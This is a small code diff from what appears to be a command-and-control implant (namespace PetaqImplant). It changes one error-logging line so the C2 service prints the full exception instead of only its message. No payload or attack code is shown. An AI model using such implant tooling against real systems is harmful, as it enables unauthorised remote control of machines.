@@ -104,7 +104,7 @@ namespace PetaqImplant
             }
             catch (Exception e)
             {
-                Console.Error.WriteLine("C2 service exception {0}",e.Message);
+                Console.Error.WriteLine("C2 service exception {0}",e);
             }
             finally
             {
